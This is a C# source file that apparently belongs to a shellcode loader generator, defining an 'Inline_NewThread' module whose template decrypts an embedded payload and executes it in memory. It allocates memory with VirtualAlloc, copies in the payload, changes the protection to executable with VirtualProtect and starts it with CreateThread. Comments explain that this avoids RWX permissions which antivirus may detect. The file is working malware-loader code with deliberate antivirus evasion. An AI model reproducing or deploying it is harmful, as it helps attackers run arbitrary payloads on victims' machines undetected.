using Models;

namespace Modules
{
    public class Inline_NewThread : Models.Module
    {
        public override string Name => "Inline_NewThread";

        public override string Description => "Execute in Inline and in new thread";

        public override Types Type => Types.Inline;

        public override string Header => Models.Defaults.Header;

        public override string Footer => Models.Defaults.Footer;

        public override string Core => @"
         byte[] payload = Decrypt(b64, key, iv);

          // inptr.zero unless you care abour where it gets allocated
            // try to avoid assigning permissions of RWX, AV may catch that
            var basAddress = Utils.Kernel32.VirtualAlloc(IntPtr.Zero, 
                payload.Length, 
                Utils.Kernel32.AllocationType.Commit | Utils.Kernel32.AllocationType.Reserve,
                Utils.Kernel32.MemoryProtection.ReadWrite);

            // could use this
            // Utils.Kernel32.WriteProcessMemory
            // but this is a shortcut
            Marshal.Copy(payload, 0, basAddress, payload.Length);

            Utils.Kernel32.VirtualProtect(basAddress, payload.Length, Utils.Kernel32.MemoryProtection.ExecuteRead, out _);

            Utils.Kernel32.CreateThread(IntPtr.Zero, 0, basAddress, IntPtr.Zero, 0, out var threadId);

            //Console.WriteLine((threadId != IntPtr.Zero) ? ""[+] Success"" : ""[!] Failure"");
      }";
    }
}
